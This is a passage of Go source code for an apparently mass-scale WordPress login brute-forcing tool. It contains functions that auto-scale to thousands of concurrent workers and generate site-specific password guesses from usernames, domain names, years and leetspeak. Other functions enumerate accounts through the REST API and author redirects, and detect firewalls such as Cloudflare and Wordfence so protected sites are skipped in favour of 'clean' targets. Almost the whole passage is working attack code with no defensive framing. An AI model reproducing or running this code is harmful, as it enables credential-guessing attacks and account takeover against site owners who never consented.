	if progressOut != nil {
		progressOut.WriteString(site + "\n")
		progressOut.Sync()
	}
}

// ============================================================================
// TURBO MODE - MAXIMIZE RESOURCE USAGE
// ============================================================================

// autoTune detects system resources and scales defaults for maximum throughput.
// Only overrides flags the user didn't explicitly set.
func autoTune() {
	cpus := runtime.NumCPU()
	totalMB := getTotalRAM()
	if totalMB <= 0 {
		totalMB = 1024
	}

	raiseFDLimit()
	tuneKernel()

	// Scale workers: ~500 per GB of RAM, capped by CPU.
	ramWorkers := int(totalMB) / 1024 * 500
	cpuWorkers := cpus * 150
	workers := min(ramWorkers, cpuWorkers)
	workers = max(workers, 200)
	workers = min(workers, 10000)

	if !flagSet("max-workers") {
		*maxWorkers = workers
	}
	if !flagSet("min-workers") {
		*minWorkers = max(workers/4, 50)
	}
	if !flagSet("max-active-sites") {
		*maxActive = min(max(workers/workersPerSite, 10), 200)
	}

	// GC: trade memory for throughput — collect less often.
	// The memory limit still caps total usage.
	debug.SetGCPercent(200)

	logPrintf("auto: %d CPUs, %d MB RAM → %d workers, %d active sites\n",
		cpus, totalMB, *maxWorkers, *maxActive)
}

func turboQueueSize() int {
	return max(*maxWorkers*4, 4096)
}

func flagSet(name string) bool {
	set := false
	flag.Visit(func(f *flag.Flag) {
		if f.Name == name {
			set = true
		}
	})
	return set
}

// getTotalRAM returns system RAM in megabytes via /proc/meminfo.
func getTotalRAM() int64 {
	b, err := os.ReadFile("/proc/meminfo")
	if err != nil {
		return 0
	}
	for _, line := range strings.Split(string(b), "\n") {
		if strings.HasPrefix(line, "MemTotal:") {
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				kb, _ := strconv.ParseInt(fields[1], 10, 64)
				return kb / 1024
			}
		}
	}
	return 0
}

// raiseFDLimit bumps the file descriptor soft limit to the hard limit.
// Each TCP connection consumes one fd. Thousands of workers = thousands of fds.
func raiseFDLimit() {
	var rLimit syscall.Rlimit
	if err := syscall.Getrlimit(syscall.RLIMIT_NOFILE, &rLimit); err != nil {
		return
	}
	if rLimit.Cur >= rLimit.Max {
		return
	}
	old := rLimit.Cur
	rLimit.Cur = rLimit.Max
	if syscall.Setrlimit(syscall.RLIMIT_NOFILE, &rLimit) == nil && *verbose {
		logPrintf("fd limit %d → %d\n", old, rLimit.Cur)
	}
}

// tuneKernel applies sysctl settings for max outbound TCP throughput.
// Requires root. Fails silently otherwise.
func tuneKernel() {
	if runtime.GOOS != "linux" {
		return
	}
	settings := [][2]string{
		{"net/ipv4/ip_local_port_range", "1024 65535"},
		{"net/ipv4/tcp_tw_reuse", "1"},
		{"net/ipv4/tcp_fin_timeout", "15"},
		{"net/core/rmem_max", "16777216"},
		{"net/core/wmem_max", "16777216"},
		{"net/ipv4/tcp_rmem", "4096 87380 16777216"},
		{"net/ipv4/tcp_wmem", "4096 65536 16777216"},
		{"fs/file-max", "1048576"},
	}
	applied := 0
	for _, s := range settings {
		if os.WriteFile("/proc/sys/"+s[0], []byte(s[1]), 0o644) == nil {
			applied++
		}
	}
	if applied > 0 && *verbose {
		logPrintf("kernel: applied %d/%d tunings\n", applied, len(settings))
	}
}

// ── DNS cache ───────────────────────────────────────────────────────────
// Avoids repeated DNS lookups when establishing new connections to the same
// hosts. At thousands of concurrent connections this removes a real bottleneck.

type dnsCacheEntry struct {
	ip      string
	expires time.Time
}

var dnsLookupCache sync.Map

func cachedDial(addr string) (net.Conn, error) {
	host, port, err := net.SplitHostPort(addr)
	if err != nil {
		return fasthttp.DialTimeout(addr, 5*time.Second)
	}

	if entry, ok := dnsLookupCache.Load(host); ok {
		e := entry.(*dnsCacheEntry)
		if time.Now().Before(e.expires) {
			return fasthttp.DialTimeout(e.ip+":"+port, 5*time.Second)
		}
		dnsLookupCache.Delete(host)
	}

	ips, lookupErr := net.LookupHost(host)
	if lookupErr != nil || len(ips) == 0 {
		return fasthttp.DialTimeout(addr, 5*time.Second)
	}

	dnsLookupCache.Store(host, &dnsCacheEntry{
		ip:      ips[0],
		expires: time.Now().Add(5 * time.Minute),
	})
	return fasthttp.DialTimeout(ips[0]+":"+port, 5*time.Second)
}

// ============================================================================
// SMART PASSWORD GENERATION
// ============================================================================

func generateSitePasswords(basePasswords []string, site string, users []string) []string {
	siteName, domainName := extractSiteInfo(site)

	var tier1 []string
	var others []string
	seen := make(map[string]bool)

	addTier1 := func(p string) {
		if p != "" && !seen[p] {
			seen[p] = true
			tier1 = append(tier1, p)
		}
	}
	addOther := func(p string) {
		if p != "" && !seen[p] && !strings.Contains(p, "[") {
			seen[p] = true
			others = append(others, p)
		}
	}

	// TIER 1: tried first, in order.
	for _, user := range users {
		addTier1(user)
		addTier1(strings.ToLower(user))
		addTier1(user + "123")
		addTier1(user + "!")
		addTier1(user + "1")
	}
	addTier1("pass")
	addTier1("password")
	addTier1("123456")
	addTier1(siteName)
	addTier1(domainName)
	addTier1(siteName + "123")
	addTier1(domainName + "123")

	year := fmt.Sprintf("%d", time.Now().Year())
	year2 := year[2:]
	prevYear := fmt.Sprintf("%d", time.Now().Year()-1)

	addTier1(siteName + year)
	addTier1(siteName + year2)
	addTier1(siteName + prevYear)
	addTier1(domainName + year)
	for _, user := range users {
		addTier1(user + year)
		addTier1(user + year2)
	}

	for _, p := range []string{"password1", "Password1", "admin123", "letmein", "welcome", "qwerty", "root", "test"} {
		addTier1(p)
	}

	// Everything else: generated variations + expanded wordlist templates.
	prevYear2 := prevYear[2:]
	for _, user := range users {
		for _, p := range generateSmartPasswords(user, siteName, domainName, year, year2, prevYear, prevYear2) {
			addOther(p)
		}
		for _, p := range expandPasswords(basePasswords, user, siteName, domainName) {
			addOther(p)
		}
	}

	rand.Shuffle(len(others), func(i, j int) {
		others[i], others[j] = others[j], others[i]
	})

	return append(tier1, others...)
}

func generateSmartPasswords(user, site, domain, year, year2, prevYear, prevYear2 string) []string {
	var passwords []string
	seen := make(map[string]bool)

	add := func(p string) {
		if p != "" && !seen[p] {
			seen[p] = true
			passwords = append(passwords, p)
		}
	}

	add(user)
	add(strings.ToLower(user))
	add("pass")
	add("password")
	add("123456")
	add(site)
	add(domain)

	bases := []string{user, site, domain}
	for _, base := range bases {
		if base == "" {
			continue
		}
		for _, s := range []string{"123", "!", "1", "12", "1234", "@", "#"} {
			add(base + s)
			add(strings.ToLower(base) + s)
		}
	}

	years := []string{year, year2, prevYear, prevYear2}
	for _, base := range bases {
		if base == "" {
			continue
		}
		for _, y := range years {
			for _, prefix := range []string{"", "@", "!", "#", "_"} {
				add(base + prefix + y)
				add(strings.ToLower(base) + prefix + y)
				add(capitalize(base) + prefix + y)
			}
		}
	}

	for _, p := range []string{
		"password1", "Password1", "Password123", "letmein", "welcome",
		"qwerty", "abc123", "monkey", "dragon", "master", "login",
		"admin123", "root", "test", "guest", "pass123", "passw0rd",
		"123456789", "12345678", "qwerty123", "1q2w3e4r", "iloveyou",
	} {
		add(p)
	}

	for _, base := range bases {
		if base == "" {
			continue
		}
		for _, s := range []string{"@123", "!123", "#123", "_123", "01", "007", "69", "99"} {
			add(base + s)
			add(capitalize(base) + s)
		}
	}

	for _, base := range bases {
		if base == "" {
			continue
		}
		leet := toLeet(base)
		if leet != base {
			add(leet)
			add(leet + "123")
			add(leet + year)
		}
	}

	for _, base := range bases {
		if base == "" {
			continue
		}
		add(strings.ToUpper(base))
		add(capitalize(base))
		add(capitalize(base) + "123")
		add(capitalize(base) + "!")
	}

	if user != "" && site != "" && user != site {
		for _, c := range []string{user + site, site + user, user + "_" + site} {
			add(c)
			add(c + "123")
		}
	}

	for _, season := range []string{"Spring", "Summer", "Fall", "Winter"} {
		add(season + year)
		add(season + year2)
		add(strings.ToLower(season) + year)
	}

	for _, p := range []string{"wordpress", "wpadmin", "wppass", "wp123", "blog", "webadmin"} {
		add(p)
	}
	if site != "" {
		add("wp" + site)
		add(site + "admin")
	}

	return passwords
}

func expandPasswords(passes []string, username, siteName, domainName string) []string {
	year := fmt.Sprintf("%d", time.Now().Year())
	year2 := year[2:]

	replacer := strings.NewReplacer(
		"[WPADMIN]", username, "[wpadmin]", username,
		"[SITENAME]", siteName, "[sitename]", siteName,
		"[DOMAINNAME]", domainName, "[domainname]", domainName,
		"[YEAR]", year, "[year]", year,
		"[YEAR2]", year2, "[year2]", year2,
		"[WPADMIN_LEET]", toLeet(username), "[SITENAME_LEET]", toLeet(siteName),
		"[WPADMIN_CAP]", capitalize(username), "[SITENAME_CAP]", capitalize(siteName),
	)

	var expanded []string
	seen := make(map[string]bool)
	for _, p := range passes {
		np := replacer.Replace(p)
		if np != "" && !seen[np] {
			seen[np] = true
			expanded = append(expanded, np)
		}
	}
	return expanded
}

// ============================================================================
// WAF & PRE-FLIGHT CHECK
// ============================================================================

// quickCheck classifies a site before we spend attempts on it.
// "" means clean; anything else is the skip reason.
func quickCheck(site string) string {
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	req.SetRequestURI(site + "/wp-login.php")
	req.Header.SetMethod("GET")
	req.Header.Set("User-Agent", randomUA())

	start := time.Now()
	err := httpClient.DoTimeout(req, resp, time.Duration(*timeoutSec)*time.Second)
	elapsed := time.Since(start)
	stats.requests.Add(1)

	if err != nil {
		return "network_error"
	}
	if elapsed.Milliseconds() > int64(*slowThresh) {
		return "slow"
	}

	switch resp.StatusCode() {
	case fasthttp.StatusNotFound:
		return "not_wordpress"
	case fasthttp.StatusForbidden, fasthttp.StatusNotAcceptable:
		return "blocked"
	case fasthttp.StatusTooManyRequests:
		return "rate_limited"
	case fasthttp.StatusServiceUnavailable:
		return "unavailable"
	}

	if *skipWaf {
		if waf := detectWAF(resp.Body(), &resp.Header); waf != "" {
			return "waf_" + waf
		}
	}

	if !isWordPressLogin(resp.Body()) {
		return "not_wordpress"
	}
	return ""
}

func detectWAF(body []byte, headers *fasthttp.ResponseHeader) string {
	wafHeaders := map[string]string{
		"CF-RAY": "cloudflare", "CF-Cache-Status": "cloudflare",
		"X-Sucuri-ID": "sucuri", "X-Sucuri-Cache": "sucuri",
	}
	for header, wafName := range wafHeaders {
		if len(headers.Peek(header)) > 0 {
			return wafName
		}
	}
	if strings.EqualFold(string(headers.Peek("Server")), "cloudflare") {
		return "cloudflare"
	}

	lower := strings.ToLower(string(body[:min(len(body), 8192)]))

	if strings.Contains(lower, "one moment") && strings.Contains(lower, "window.location.reload") {
		return "cf_js_challenge"
	}

	wafSignatures := map[string]string{
		"challenge-platform": "cloudflare", "cf-browser-verification": "cloudflare",
		"wordfence": "wordfence", "wfwaf": "wordfence",
		"sucuri": "sucuri", "imunify360": "imunify",
		"captcha-delivery": "captcha", "mod_security": "modsec", "modsecurity": "modsec",
		"g-recaptcha": "recaptcha", "h-captcha": "hcaptcha", "cf-turnstile": "turnstile",
		"access denied": "waf", "request blocked": "waf",
		"verify you are human": "waf", "too many requests": "ratelimit", "firewall": "waf",
	}
	for sig, wafName := range wafSignatures {
		if strings.Contains(lower, sig) {
			return wafName
		}
	}
	return ""
}

func isWordPressLogin(body []byte) bool {
	lower := strings.ToLower(string(body))
	return strings.Contains(lower, "name=\"log\"") &&
		strings.Contains(lower, "name=\"pwd\"") &&
		(strings.Contains(lower, "wp-login") || strings.Contains(lower, "wordpress"))
}

// ============================================================================
// USER ENUMERATION
// ============================================================================

func enumerateUsers(site string) []string {
	var mu sync.Mutex
	seen := make(map[string]bool)
	var users []string

	addUser := func(u string) {
		u = strings.TrimSpace(u)
		if u == "" || len(u) > 60 {
			return
		}
		mu.Lock()
		if !seen[u] {
			seen[u] = true
			users = append(users, u)
		}
		mu.Unlock()
	}
	userCount := func() int {
		mu.Lock()
		defer mu.Unlock()
		return len(users)
	}

	var wg sync.WaitGroup

	// REST API (pretty permalink route + plain permalink fallback).
	wg.Add(1)
	go func() {
		defer wg.Done()
		endpoints := []string{
			site + "/wp-json/wp/v2/users",
			site + "/index.php?rest_route=/wp/v2/users",
		}
		for _, endpoint := range endpoints {
			req := fasthttp.AcquireRequest()
			resp := fasthttp.AcquireResponse()
			req.SetRequestURI(endpoint)
			req.Header.SetMethod("GET")
			req.Header.Set("User-Agent", randomUA())
			req.Header.Set("Accept", "application/json")

			err := httpClient.DoTimeout(req, resp, time.Duration(*timeoutSec)*time.Second)
			stats.requests.Add(1)

			if err == nil && resp.StatusCode() == 200 {
				var restUsers []struct {
					Slug string `json:"slug"`
				}
				if json.Unmarshal(resp.Body(), &restUsers) == nil {
					for _, u := range restUsers {
						addUser(u.Slug)
					}
				}
			}
			fasthttp.ReleaseRequest(req)
			fasthttp.ReleaseResponse(resp)
			if userCount() > 0 {
				return
			}
		}
	}()

	// Author archive redirects.
	for i := 1; i <= 5; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			req := fasthttp.AcquireRequest()
			resp := fasthttp.AcquireResponse()
			req.SetRequestURI(fmt.Sprintf("%s/?author=%d", site, id))
			req.Header.SetMethod("HEAD")
			req.Header.Set("User-Agent", randomUA())

			err := httpClient.DoTimeout(req, resp, time.Duration(*timeoutSec)*time.Second)
			stats.requests.Add(1)

			if err == nil {
				loc := string(resp.Header.Peek("Location"))
				if strings.Contains(loc, "/author/") {
					parts := strings.Split(loc, "/author/")
					if len(parts) > 1 {
						addUser(strings.Trim(parts[1], "/"))
					}
				}
			}
			fasthttp.ReleaseRequest(req)
			fasthttp.ReleaseResponse(resp)
		}(i)
	}

	wg.Wait()
	return users
}

// ============================================================================
// SCAN MODE
// ============================================================================

type scanResult struct {
	site    string
	status  string
	users   []string
	latency int64
}

func runScanMode(sites []string) {
	httpClient = newHTTPClient()
	fmt.Fprintf(os.Stderr, "scan mode: checking %d sites\n", len(sites))
	start := time.Now()

	workers := min(*maxWorkers, 300)
	workers = max(workers, 10)

	resCh := make(chan scanResult, len(sites))
	siteCh := make(chan string, 256)
	var wg sync.WaitGroup

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for site := range siteCh {
				resCh <- scanSite(site)
			}
		}()
	}
	for _, s := range sites {
		siteCh <- s
	}
	close(siteCh)
	go func() {
		wg.Wait()
		close(resCh)
	}()

	var clean, protected, notWP, noUsers, timeouts int
	var cleanSites []string

	for r := range resCh {
		switch r.status {
		case "ok":
			clean++
			cleanSites = append(cleanSites, r.site)
			if *verbose {
				fmt.Fprintf(os.Stderr, "✓ %s [%dms] users:%v\n", r.site, r.latency, r.users)
			}
		case "timeout", "network_error":
			timeouts++
			if *debugFlag {
				fmt.Fprintf(os.Stderr, "⏱ %s: %s\n", r.site, r.status)
			}
		case "not_wp":
			notWP++
			if *debugFlag {
				fmt.Fprintf(os.Stderr, "✗ %s: not wordpress\n", r.site)
			}
		case "no_users":
			noUsers++
			if *debugFlag {
				fmt.Fprintf(os.Stderr, "✗ %s: no users found\n", r.site)
			}
		default:
			protected++
			if *debugFlag {
				fmt.Fprintf(os.Stderr, "🛡 %s: %s\n", r.site, r.status)
			}
		}
	}

	if len(cleanSites) > 0 {
		if f, err := os.OpenFile(*scanOutput, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0o600); err == nil {
			for _, s := range cleanSites {
				f.WriteString(s + "\n")
			}
			f.Close()
		}
	}

	elapsed := time.Since(start)
	fmt.Fprintf(os.Stderr, "\nscan complete in %v\n", elapsed.Round(time.Millisecond))
	fmt.Fprintf(os.Stderr, "  ✓ clean:      %d\n  🛡 protected: %d\n  ✗ not wp:     %d\n  👤 no users:  %d\n  ⏱ timeout:   %d\n",
		clean, protected, notWP, noUsers, timeouts)
	if len(cleanSites) > 0 {
		fmt.Fprintf(os.Stderr, "clean sites saved to %s\n", *scanOutput)
	}
	fmt.Printf("clean = %d/%d\n", clean, len(sites))
}

func scanSite(site string) scanResult {
	result := scanResult{site: site}

	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	req.SetRequestURI(site + "/wp-login.php")
	req.Header.SetMethod("GET")
	req.Header.Set("User-Agent", randomUA())

	start := time.Now()
	err := httpClient.DoTimeout(req, resp, 5*time.Second)
	result.latency = time.Since(start).Milliseconds()

	if err != nil {
		result.status = "timeout"
		return result
	}

	status := resp.StatusCode()
	switch {
	case status == fasthttp.StatusNotFound:
		result.status = "not_wp"
		return result
	case status == fasthttp.StatusForbidden || status == fasthttp.StatusNotAcceptable ||
		status == fasthttp.StatusTooManyRequests || status == fasthttp.StatusServiceUnavailable:
		result.status = "blocked"
		return result
	}

	if waf := detectWAF(resp.Body(), &resp.Header); waf != "" {
		result.status = waf
		return result
	}

	if !isWordPressLogin(resp.Body()) {
		result.status = "not_wp"
		return result
	}

	users := enumerateUsers(site)
	if len(users) == 0 {
		result.status = "no_users"
		return result
	}

	result.status = "ok"
	result.users = users
	return result
}

// ============================================================================
// PROGRESS
// ============================================================================

func displayProgress(total int) {
	if !*verbose {
		<-workerStop
		return
	}
	t := time.NewTicker(500 * time.Millisecond)
	defer t.Stop()
	for {
		select {
		case <-workerStop:
			return
		case <-t.C:
			var m runtime.MemStats
			runtime.ReadMemStats(&m)
			elapsed := time.Since(startTime).Seconds()
			fmt.Fprintf(os.Stderr, "\r\033[K[%d/%d sites] w:%d/%d q:%d | ✓%d ⊘%d | %.0f/s | heap:%dMB",
				stats.completed.Load(), total,
				liveWorkers.Load(), targetWorkers.Load(),
				len(attemptQueue),
				stats.cracked.Load(), stats.skipped.Load(),
				float64(stats.requests.Load())/elapsed, m.HeapAlloc>>20)
		}
	}
}

// ============================================================================
// UTILITIES
// ============================================================================

func newHTTPClient() *fasthttp.Client {
	connsPerHost := max(*maxWorkers/max(*maxActive, 1)*2, 64)
	c := &fasthttp.Client{
		ReadTimeout:                   time.Duration(*timeoutSec) * time.Second,
		WriteTimeout:                  time.Duration(*timeoutSec) * time.Second,
		MaxConnsPerHost:               connsPerHost,
		MaxIdleConnDuration:           60 * time.Second,
		MaxConnWaitTimeout:            10 * time.Second,
		MaxResponseBodySize:           2 << 20,
		NoDefaultUserAgentHeader:      true,
		DisableHeaderNamesNormalizing: true,
		Dial:                          cachedDial,
	}
	return c
}

func readLines(path string) ([]string, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var lines []string
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if line != "" && !strings.HasPrefix(line, "#") {
			lines = append(lines, line)
		}
	}
	return lines, nil
}

func normalizeSite(site string) string {
	site = strings.TrimSpace(site)
	if !strings.HasPrefix(site, "http://") && !strings.HasPrefix(site, "https://") {
		site = "https://" + site
	}
	return strings.TrimRight(site, "/")
}

func dedupeSites(raw []string) []string {
	seen := make(map[string]bool, len(raw))
	out := make([]string, 0, len(raw))
	for _, s := range raw {
		n := normalizeSite(s)
		if !seen[n] {
			seen[n] = true
			out = append(out, n)
		}
	}
	return out
}

var multiPartTLDs = map[string]bool{
	"co.uk": true, "org.uk": true, "ac.uk": true, "gov.uk": true,
	"com.au": true, "net.au": true, "org.au": true,
	"co.id": true, "or.id": true, "ac.id": true,
	"com.br": true, "com.mx": true, "co.nz": true, "co.in": true,
	"com.tr": true, "com.sg": true, "com.my": true, "com.ph": true,
	"co.za": true, "com.co": true, "com.ar": true, "com.pl": true,
}

// extractSiteInfo returns the site's distinguishing label. IP targets have
// no domain label, so they return "".
func extractSiteInfo(siteURL string) (siteName, domainName string) {
	parsed, err := url.Parse(siteURL)
	if err != nil || parsed == nil {
		return "", ""
	}
	host := strings.TrimPrefix(parsed.Hostname(), "www.")
	if net.ParseIP(host) != nil {
		return "", ""
	}
	parts := strings.Split(host, ".")
	switch {
	case len(parts) >= 3 && multiPartTLDs[parts[len(parts)-2]+"."+parts[len(parts)-1]]:
		siteName = parts[len(parts)-3]
	case len(parts) >= 2:
		siteName = parts[len(parts)-2]
	default:
		siteName = parts[0]
	}
	return siteName, siteName
}

func extractDomain(site string) string {
	parsed, err := url.Parse(site)
	if err != nil || parsed == nil {
		return site
	}
	return parsed.Hostname()
}

func randomUA() string {
	return userAgents[rand.Intn(len(userAgents))]
}

func toLeet(s string) string {
	return strings.NewReplacer(
		"a", "4", "A", "4", "e", "3", "E", "3",
		"i", "1", "I", "1", "o", "0", "O", "0",
		"s", "5", "S", "5", "t", "7", "T", "7",
	).Replace(s)
}

func capitalize(s string) string {
	if len(s) == 0 {
		return s
	}
	return strings.ToUpper(string(s[0])) + s[1:]
}

func truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max-3] + "..."
}
